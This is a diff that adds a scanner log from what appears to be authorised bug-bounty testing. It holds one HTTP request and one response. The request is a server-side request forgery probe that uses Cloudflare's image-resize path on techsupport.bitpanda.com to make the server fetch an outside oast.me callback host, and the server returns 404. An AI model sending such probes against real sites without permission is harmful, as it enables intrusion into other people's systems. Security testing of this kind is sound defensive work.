@@ -1,0 +1,26 @@
+[cloudflare-external-image-resize] Dumped HTTP request for http://techsupport.bitpanda.com/cdn-cgi/image/width/https://d28vs52us8n0rrg3ds80t6y3w176fzowq.oast.me
+
+
+GET /cdn-cgi/image/width/https://d28vs52us8n0rrg3ds80t6y3w176fzowq.oast.me HTTP/1.1
+Host: techsupport.bitpanda.com
+User-Agent: Mozilla/5.0 (Knoppix; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+Connection: close
+Accept: */*
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Accept-Encoding: gzip
+
+
+[cloudflare-external-image-resize] Dumped HTTP response http://techsupport.bitpanda.com/cdn-cgi/image/width/https://d28vs52us8n0rrg3ds80t6y3w176fzowq.oast.me
+
+HTTP/1.1 404 Not Found
+Connection: close
+Transfer-Encoding: chunked
+Cf-Ray: 96a66fc96963d6a8-IAD
+Date: Tue, 05 Aug 2025 12:53:18 GMT
+Nel: {"success_fraction":0.01,"report_to":"cf-nel","max_age":604800}
+Report-To: {"endpoints":[{"url":"https:\/\/a.nel.cloudflare.com\/report\/v4?s=qkBV8d3ALfGi8l63oN9GpgbpA1K3xZPd%2FRBfpKfCfJa%2Fa5EbHIp5%2FaEikNyJZ0dZrxOWqbC%2F1zgneJtMoUW2trXHsY7fCImBd4sxjhexh7pWv1a09nwO2n7NxUAK55N%2FVePAMsatEFWZOg%3D%3D"}],"group":"cf-nel","max_age":604800}
+Server: cloudflare
+Set-Cookie: __cf_bm=SW1iFZYO3n12_z9ZYYA5Wsy8KB0_DI4yZRcSxLHpOm4-1754398398-1.0.1.1-ebJzWO60M8lei4sl4fTJDVZQltHxHt6cu.QFE2dVd50NLMZysNdzaTEsCbwkbKc8P9O5_fV6pALL8XEoHgI4ZhdYdh2BMAu58O0up.RWSF4; path=/; expires=Tue, 05-Aug-25 13:23:18 GMT; domain=.techsupport.bitpanda.com; HttpOnly
+Set-Cookie: _cfuvid=W8x4wkDIbbNnV14Dk5hFdxUBkEgO_1CmrCY40YVXk3E-1754398398966-0.0.1.1-604800000; path=/; domain=.techsupport.bitpanda.com; HttpOnly
+
+
